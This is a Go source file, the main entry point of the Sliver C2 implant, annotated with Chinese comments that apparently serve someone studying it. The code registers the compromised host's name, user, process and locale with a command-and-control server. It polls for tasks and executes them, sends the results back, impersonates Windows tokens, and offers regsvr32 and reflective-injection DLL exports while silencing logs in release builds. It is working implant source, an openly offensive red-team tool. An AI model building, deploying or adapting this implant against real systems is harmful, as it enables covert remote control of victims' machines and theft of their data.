package main

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// {{if or .Config.IsSharedLib }}
//#include "sliver.h"
import "C"

// {{end}}

import (
	"crypto/rand"
	"encoding/binary"
	"log"
	insecureRand "math/rand"
	"os"
	"os/user"
	"runtime"
	"time"

	// {{if .Config.IsBeacon}}
	"sync"
	// {{end}}

	// {{if .Config.Debug}}{{else}}
	"io/ioutil"
	// {{end}}

	consts "github.com/bishopfox/sliver/implant/sliver/constants"
	"github.com/bishopfox/sliver/implant/sliver/handlers"
	"github.com/bishopfox/sliver/implant/sliver/hostuuid"
	"github.com/bishopfox/sliver/implant/sliver/limits"
	"github.com/bishopfox/sliver/implant/sliver/locale"
	"github.com/bishopfox/sliver/implant/sliver/pivots"
	"github.com/bishopfox/sliver/implant/sliver/transports"
	"github.com/bishopfox/sliver/implant/sliver/version"
	"github.com/bishopfox/sliver/protobuf/sliverpb"

	"github.com/gofrs/uuid"
	"google.golang.org/protobuf/proto"
	"google.golang.org/protobuf/reflect/protoreflect"

	// {{if .Config.IsService}}
	"golang.org/x/sys/windows/svc"
	// {{end}}
)

var (
	InstanceID       string //全局UUID
	connectionErrors = 0
)

// 生成UUID
// 如果uuid.NewV4没有正常生成，则自己随机生成一个16位字符串作为uuid
func init() {
	buf := make([]byte, 8)
	n, err := rand.Read(buf)
	if err != nil || n != len(buf) {
		insecureRand.Seed(time.Now().Unix())
	} else {
		insecureRand.Seed(int64(binary.LittleEndian.Uint64(buf)))
	}
	id, err := uuid.NewV4()
	if err != nil {
		buf := make([]byte, 16) // NewV4 fails if secure rand fails
		insecureRand.Read(buf)
		id = uuid.FromBytesOrNil(buf)
	}
	InstanceID = id.String()
}

// {{if .Config.IsService}}

type sliverService struct{}

func (serv *sliverService) Execute(args []string, r <-chan svc.ChangeRequest, changes chan<- svc.Status) (ssec bool, errno uint32) {
	const cmdsAccepted = svc.AcceptStop | svc.AcceptShutdown | svc.AcceptPauseAndContinue
	changes <- svc.Status{State: svc.Running, Accepts: cmdsAccepted}
	for {
		select {
		default:
			// {{if .Config.IsBeacon}}
			beaconStartup()
			// {{else}}
			sessionStartup()
			// {{end}}
		case c := <-r:
			switch c.Cmd {
			case svc.Interrogate:
				changes <- c.CurrentStatus
			case svc.Stop, svc.Shutdown:
				changes <- svc.Status{State: svc.Stopped, Accepts: cmdsAccepted}
			case svc.Pause:
				changes <- svc.Status{State: svc.Paused, Accepts: cmdsAccepted}
			case svc.Continue:
				changes <- svc.Status{State: svc.Running, Accepts: cmdsAccepted}
			default:
			}
		}
	}
	return
}

// {{end}}

// {{if or .Config.IsSharedLib .Config.IsShellcode}}
var isRunning bool = false

// StartW - Export for shared lib build
//
//export StartW
func StartW() {
	//使用isRunning作为类似互斥体的判断，保证只运行一次
	if !isRunning {
		isRunning = true
		main()
	}
}

// Thanks Ne0nd0g for those
//https://github.com/Ne0nd0g/merlin/blob/master/cmd/merlinagentdll/main.go#L65

// VoidFunc is an exported function used with PowerSploit's Invoke-ReflectivePEInjection.ps1
//
//export VoidFunc
func VoidFunc() { main() }

// DllInstall is used when executing the Sliver implant with regsvr32.exe (i.e. regsvr32.exe /s /n /i sliver.dll)
// https://msdn.microsoft.com/en-us/library/windows/desktop/bb759846(v=vs.85).aspx
//
//export DllInstall
func DllInstall() { main() }

// DllRegisterServer - is used when executing the Sliver implant with regsvr32.exe (i.e. regsvr32.exe /s sliver.dll)
// https://msdn.microsoft.com/en-us/library/windows/desktop/ms682162(v=vs.85).aspx
//
//export DllRegisterServer
func DllRegisterServer() { main() }

// DllUnregisterServer - is used when executing the Sliver implant with regsvr32.exe (i.e. regsvr32.exe /s /u sliver.dll)
// https://msdn.microsoft.com/en-us/library/windows/desktop/ms691457(v=vs.85).aspx
//
//export DllUnregisterServer
func DllUnregisterServer() { main() }

// {{end}}

func main() {

	// {{if .Config.Debug}}
	log.SetFlags(log.LstdFlags | log.Lshortfile)
	// {{else}}
	log.SetFlags(0)
	log.SetOutput(ioutil.Discard)
	// {{end}}

	// {{if .Config.Debug}}
	log.Printf("Hello my name is %s", consts.SliverName)
	// {{end}}

	// 进行机器名、文件名、时间等信息校验，不匹配则直接退出
	limits.ExecLimits() // Check to see if we should execute

	// {{if .Config.IsService}}
	svc.Run("", &sliverService{})
	// {{else}}

	// {{if .Config.IsBeacon}}
	beaconStartup()
	// {{else}} ------- IsBeacon/IsSession -------
	sessionStartup()
	// {{end}}

	// {{end}} ------- IsService -------
}

// {{if .Config.IsBeacon}}
func beaconStartup() {
	// {{if .Config.Debug}}
	log.Printf("Running in Beacon mode with ID: %s", InstanceID)
	// {{end}}
	abort := make(chan struct{})
	//当函数结束时，将transports.StartBeaconLoop中的Beacon生成结束掉
	//当前函数结束后，会在abort这个管道中写入数据
	defer func() {
		abort <- struct{}{}
	}()
	// 该函数会在内存中再生成一个Beacon，当前一个beacon因为异常退出后，会将后台的那个Beacon再从beacons这个chan中读取出来，并重新进入beaconMainLoop函数执行
	beacons := transports.StartBeaconLoop(abort)
	// beacons 是一个阻塞的channel，该循环不会退出，他会一直尝试从beacons这个channel中去读取数据。如果一直无法从beacons中读出来数据那么他将一直不会退出
	for beacon := range beacons {
		// {{if .Config.Debug}}
		log.Printf("Next beacon = %v", beacon)
		// {{end}}
		// 如果能够从beacons这个channel中读取到beacon，并且不为nil，那么进入主循环
		if beacon != nil {
			err := beaconMainLoop(beacon)
			// 仅当执行出现问题时才会return，执行到这里
			// 将错误次数+1，直到超过允许的最大错误次数，则return，真正退出
			if err != nil {
				connectionErrors++
				if transports.GetMaxConnectionErrors() < connectionErrors {
					return
				}
			}
		}
		reconnect := transports.GetReconnectInterval()
		// {{if .Config.Debug}}
		log.Printf("Reconnect sleep: %s", reconnect)
		// {{end}}
		time.Sleep(reconnect)
	}
}

// {{else}}

func sessionStartup() {
	// {{if .Config.Debug}}
	log.Printf("Running in session mode")
	// {{end}}
	abort := make(chan struct{})
	defer func() {
		abort <- struct{}{}
	}()
	connections := transports.StartConnectionLoop(abort)
	for connection := range connections {
		if connection != nil {
			err := sessionMainLoop(connection)
			if err != nil {
				connectionErrors++
				if transports.GetMaxConnectionErrors() < connectionErrors {
					return
				}
			}
		}
		reconnect := transports.GetReconnectInterval()
		// {{if .Config.Debug}}
		log.Printf("Reconnect sleep: %s", reconnect)
		// {{end}}
		time.Sleep(reconnect)
	}
}

// {{end}}

// {{if .Config.IsBeacon}}
func beaconMainLoop(beacon *transports.Beacon) error {
	// Register beacon
	// httpbeacon: 发送第一次请求，并获得到SessionID
	err := beacon.Init()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Beacon init error: %s", err)
		// {{end}}
		return err
	}
	defer func() {
		err := beacon.Cleanup()
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("[beacon] cleanup failure %s", err)
			// {{end}}
		}
	}()

	// httpbeacon: 没有Start()
	err = beacon.Start()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Error starting beacon: %s", err)
		// {{end}}
		connectionErrors++
		if transports.GetMaxConnectionErrors() < connectionErrors {
			return err
		}
		return nil
	}
	// 成功连接一次，Error次数就置零
	connectionErrors = 0
	// {{if .Config.Debug}}
	log.Printf("Registering beacon with server")
	// {{end}}
	// 拿到间隔时间+抖动时间，从而得到下一次的上线时间
	nextCheckin := time.Now().Add(beacon.Duration())
	// 获取主机信息
	register := registerSliver()
	register.ActiveC2 = beacon.ActiveC2
	register.ProxyURL = beacon.ProxyURL
	// httpbeacon: 发送Post请求，将Beacon信息回传
	beacon.Send(wrapEnvelope(sliverpb.MsgBeaconRegister, &sliverpb.BeaconRegister{
		ID:          InstanceID, //uuid
		Interval:    beacon.Interval(),
		Jitter:      beacon.Jitter(),
		Register:    register,                           // 主机信息中也有一个UUID
		NextCheckin: int64(beacon.Duration().Seconds()), // 下次回连的间隔秒数 .Seconds()将时间转换为秒
	}))
	time.Sleep(time.Second)
	// httpbeacon: 没有Close()
	beacon.Close()

	// BeaconMain - Is executed in it's own goroutine as the function will block
	// until all tasks complete (in success or failure), if a task handler blocks
	// forever it will simply block this set of tasks instead of the entire beacon
	errors := make(chan error)
	// 当间隔时间被修改后，会触发短路shortCircuit
	// 因为要在下次使用新的间隔时间
	shortCircuit := make(chan struct{})
	// 死循环，除非发生错误，否则不跳出
	for {
		duration := beacon.Duration()
		nextCheckin = time.Now().Add(duration)
		// 主要用来任务接收与执行
		go func() {
			oldInterval := beacon.Interval()
			err := beaconMain(beacon, nextCheckin)
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("[beacon] main error: %v", nextCheckin)
				// {{end}}
				errors <- err
			} else if oldInterval != beacon.Interval() { // 间隔时间是否修改
				// The beacon's interval was modified so we need to short circuit
				// the current sleep and tell the server when the next checkin will
				// be based on the new interval.
				shortCircuit <- struct{}{}
			}
		}()

		// {{if .Config.Debug}}
		log.Printf("[beacon] sleep until %v", nextCheckin)
		// {{end}}
		// 跳过条件：错误、短路、超时
		select {
		case <-errors:
			return err
		case <-time.After(duration):
		case <-shortCircuit:
			// Short circuit current duration with no error
		}
	}
	return nil
}

func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
	err := beacon.Start()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[beacon] start failure %s", err)
		// {{end}}
		return err
	}
	defer func() {
		// {{if .Config.Debug}}
		log.Printf("[beacon] closing ...")
		// {{end}}
		time.Sleep(time.Second)
		beacon.Close()
	}()
	// {{if .Config.Debug}}
	log.Printf("[beacon] sending check in ...")
	// {{end}}
	// httpbeacon: 发送Checkin
	err = beacon.Send(wrapEnvelope(sliverpb.MsgBeaconTasks, &sliverpb.BeaconTasks{
		ID:          InstanceID,
		NextCheckin: int64(beacon.Duration().Seconds()),
	}))
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[beacon] send failure %s", err)
		// {{end}}
		return err
	}
	// {{if .Config.Debug}}
	log.Printf("[beacon] recv task(s) ...")
	// {{end}}
	// httpbeacon: Get请求 envelope为接收到的数据
	envelope, err := beacon.Recv()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[beacon] recv failure %s", err)
		// {{end}}
		return err
	}
	if envelope == nil {
		// {{if .Config.Debug}}
		log.Printf("[beacon] read nil envelope (no tasks)")
		// {{end}}
		return nil
	}
	// 反序列化拿到任务
	tasks := &sliverpb.BeaconTasks{}
	err = proto.Unmarshal(envelope.Data, tasks)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[beacon] unmarshal failure %s", err)
		// {{end}}
		return err
	}

	// {{if .Config.Debug}}
	log.Printf("[beacon] received %d task(s) from server", len(tasks.Tasks))
	// {{end}}
	if len(tasks.Tasks) == 0 {
		return nil
	}

	// 多任务同时执行，然后添加到当前结构体中
	results := []*sliverpb.Envelope{}
	resultsMutex := &sync.Mutex{}
	wg := &sync.WaitGroup{}
	// 功能RPC map
	sysHandlers := handlers.GetSystemHandlers()
	// 特殊的RPC map   当前只有Kill
	specHandlers := handlers.GetSpecialHandlers()

	for _, task := range tasks.Tasks {
		// {{if .Config.Debug}}
		log.Printf("[beacon] execute task %d", task.Type)
		// {{end}}
		// 判断任务类型是否存在 sysHandlers
		if handler, ok := sysHandlers[task.Type]; ok {
			wg.Add(1)
			data := task.Data
			// 用于结果回传时的标识
			taskID := task.ID
			// 下面为功能执行，Windows和非Windows实际的执行流程一致
			// 唯一的区别是，Windows进行了一层包装，在执行前后加入了对Token的模拟和恢复
			// {{if eq .Config.GOOS "windows" }}
			go handlers.WrapperHandler(handler, data, func(data []byte, err error) {
				resultsMutex.Lock()
				defer resultsMutex.Unlock()
				defer wg.Done()
				// {{if .Config.Debug}}
				if err != nil {
					log.Printf("[beacon] handler function returned an error: %s", err)
				}
				log.Printf("[beacon] task completed (id: %d)", taskID)
				// {{end}}
				// 任务结果回传
				results = append(results, &sliverpb.Envelope{
					ID:   taskID,
					Data: data,
				})
			})
			//  {{else}}
			go handler(data, func(data []byte, err error) {
				resultsMutex.Lock()
				defer resultsMutex.Unlock()
				defer wg.Done()
				// {{if .Config.Debug}}
				if err != nil {
					log.Printf("[beacon] handler function returned an error: %s", err)
				}
				log.Printf("[beacon] task completed (id: %d)", taskID)
				// {{end}}
				results = append(results, &sliverpb.Envelope{
					ID:   taskID,
					Data: data,
				})
			})
			// {{end}}
		} else if task.Type == sliverpb.MsgOpenSession { // 类型是否为 MsgOpenSession
			go openSessionHandler(task.Data)
			resultsMutex.Lock()
			results = append(results, &sliverpb.Envelope{
				ID:   task.ID,
				Data: []byte{},
			})
			resultsMutex.Unlock()
		} else if handler, ok := specHandlers[task.Type]; ok { // 判断是否是退出
			wg.Add(1)
			handler(task.Data, nil)
		} else { // 未知的类型
			resultsMutex.Lock()
			results = append(results, &sliverpb.Envelope{
				ID:                 task.ID,
				UnknownMessageType: true,
			})
			resultsMutex.Unlock()
		}
	}
	// {{if .Config.Debug}}
	log.Printf("[beacon] waiting for task(s) to complete ...")
	// {{end}}
	// 等待任务执行完毕
	wg.Wait() // Wait for all tasks to complete
	// {{if .Config.Debug}}
	log.Printf("[beacon] all tasks completed, sending results to server")
	// {{end}}

	// 发送Post请求，回传任务执行结果
	err = beacon.Send(wrapEnvelope(sliverpb.MsgBeaconTasks, &sliverpb.BeaconTasks{
		ID:    InstanceID,
		Tasks: results,
	}))
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[beacon] error sending results %s", err)
		// {{end}}
	}
	// {{if .Config.Debug}}
	log.Printf("[beacon] all results sent to server, cleanup ...")
	// {{end}}
	return nil
}

func openSessionHandler(data []byte) {
	openSession := &sliverpb.OpenSession{}
	err := proto.Unmarshal(data, openSession)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[beacon] failed to parse open session msg: %s", err)
		// {{end}}
	}

	if openSession.Delay != 0 {
		// {{if .Config.Debug}}
		log.Printf("[beacon] delay %s", time.Duration(openSession.Delay))
		// {{end}}
		time.Sleep(time.Duration(openSession.Delay))
	}

	go func() {
		abort := make(chan struct{})
		connections := transports.StartConnectionLoop(abort)
		defer func() { abort <- struct{}{} }()
		connectionAttempts := 0
		for connection := range connections {
			connectionAttempts++
			if connection != nil {
				err := sessionMainLoop(connection)
				if err == nil {
					break
				}
				// {{if .Config.Debug}}
				log.Printf("[beacon] failed to connect to server: %s", err)
				// {{end}}
			}
			if len(openSession.C2S) <= connectionAttempts {
				// {{if .Config.Debug}}
				log.Printf("[beacon] failed to connect to server, max connection attempts reached")
				// {{end}}
				break
			}
		}
	}()
}

// {{end}} -IsBeacon

func sessionMainLoop(connection *transports.Connection) error {
	if connection == nil {
		// {{if .Config.Debug}}
		log.Printf("[session] nil connection!")
		// {{end}}
		return nil
	}
	err := connection.Start()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[session] failed to establish connection: %s", err)
		// {{end}}
		return err
	}
	pivots.RestartAllListeners(connection.Send)
	defer pivots.StopAllListeners()
	defer connection.Stop()

	connectionErrors = 0
	// Reconnect active pivots
	// pivots.ReconnectActivePivots(connection)
	register := registerSliver()
	register.ActiveC2 = connection.URL()
	register.ProxyURL = connection.ProxyURL()
	connection.Send <- wrapEnvelope(sliverpb.MsgRegister, register) // Send registration information

	pivotHandlers := handlers.GetPivotHandlers()
	tunHandlers := handlers.GetTunnelHandlers()
	sysHandlers := handlers.GetSystemHandlers()
	specialHandlers := handlers.GetSpecialHandlers()
	rportfwdHandlers := handlers.GetRportFwdHandlers()

	for envelope := range connection.Recv {
		if handler, ok := specialHandlers[envelope.Type]; ok {
			// {{if .Config.Debug}}
			log.Printf("[recv] specialHandler %d", envelope.Type)
			// {{end}}
			handler(envelope.Data, connection)
		} else if handler, ok := pivotHandlers[envelope.Type]; ok {
			// {{if .Config.Debug}}
			log.Printf("[recv] pivotHandler with type %d", envelope.Type)
			// {{end}}
			go handler(envelope, connection)
		} else if handler, ok := rportfwdHandlers[envelope.Type]; ok {
			// {{if .Config.Debug}}
			log.Printf("[recv] rportfwdHandler with type %d", envelope.Type)
			// {{end}}
			go handler(envelope, connection)
		} else if handler, ok := sysHandlers[envelope.Type]; ok {
			// Beware, here be dragons.
			// This is required for the specific case of token impersonation:
			// Since goroutines don't always execute in the same thread, but ImpersonateLoggedOnUser
			// only applies the token to the calling thread, we need to call it before every task.
			// It's fucking gross to do that here, but I could not come with a better solution.

			// {{if .Config.Debug}}
			log.Printf("[recv] sysHandler %d", envelope.Type)
			// {{end}}

			// {{if eq .Config.GOOS "windows" }}
			go handlers.WrapperHandler(handler, envelope.Data, func(data []byte, err error) {
				// {{if .Config.Debug}}
				if err != nil {
					log.Printf("[session] handler function returned an error: %s", err)
				}
				// {{end}}
				connection.Send <- &sliverpb.Envelope{
					ID:   envelope.ID,
					Data: data,
				}
			})
			// {{else}}
			go handler(envelope.Data, func(data []byte, err error) {
				// {{if .Config.Debug}}
				if err != nil {
					log.Printf("[session] handler function returned an error: %s", err)
				}
				// {{end}}
				connection.Send <- &sliverpb.Envelope{
					ID:   envelope.ID,
					Data: data,
				}
			})
			// {{end}}
		} else if handler, ok := tunHandlers[envelope.Type]; ok {
			// {{if .Config.Debug}}
			log.Printf("[recv] tunHandler %d", envelope.Type)
			// {{end}}
			go handler(envelope, connection)
		} else if envelope.Type == sliverpb.MsgCloseSession {
			return nil
		} else {
			// {{if .Config.Debug}}
			log.Printf("[recv] unknown envelope type %d", envelope.Type)
			// {{end}}
			connection.Send <- &sliverpb.Envelope{
				ID:                 envelope.ID,
				Data:               nil,
				UnknownMessageType: true,
			}
		}
	}
	return nil
}

// Envelope - Creates an envelope with the given type and data.
// 转换结构，消息类型+消息内容(序列化后的)
func wrapEnvelope(msgType uint32, message protoreflect.ProtoMessage) *sliverpb.Envelope {
	data, err := proto.Marshal(message)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Failed to encode register msg %s", err)
		// {{end}}
		return nil
	}
	return &sliverpb.Envelope{
		Type: msgType,
		Data: data,
	}
}

// registerSliver - Creates a registration protobuf message
func registerSliver() *sliverpb.Register {
	hostname, err := os.Hostname()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Failed to determine hostname %s", err)
		// {{end}}
		hostname = ""
	}
	currentUser, err := user.Current()
	if err != nil {

		// {{if .Config.Debug}}
		log.Printf("Failed to determine current user %s", err)
		// {{end}}

		// Gracefully error out
		currentUser = &user.User{
			Username: "<err>",
			Uid:      "<err>",
			Gid:      "<err>",
		}

	}
	filename, err := os.Executable()
	// Should not happen, but still...
	if err != nil {
		// TODO: build the absolute path to os.Args[0]
		if 0 < len(os.Args) {
			filename = os.Args[0]
		} else {
			filename = "<err>"
		}
	}

	// Retrieve UUID
	uuid := hostuuid.GetUUID()
	// {{if .Config.Debug}}
	log.Printf("Host Uuid: %s", uuid)
	// {{end}}

	return &sliverpb.Register{
		Name:              consts.SliverName,
		Hostname:          hostname,
		Uuid:              uuid,
		Username:          currentUser.Username,
		Uid:               currentUser.Uid,
		Gid:               currentUser.Gid,
		Os:                runtime.GOOS,
		Version:           version.GetVersion(), // 获取操作系统信息
		Arch:              runtime.GOARCH,
		Pid:               int32(os.Getpid()),
		Filename:          filename,
		ReconnectInterval: int64(transports.GetReconnectInterval()), // 默认的回连间隔
		ConfigID:          "{{ .Config.ID }}",
		PeerID:            pivots.MyPeerID,    // 与内网互联有关
		Locale:            locale.GetLocale(), // 获取语言
	}
}
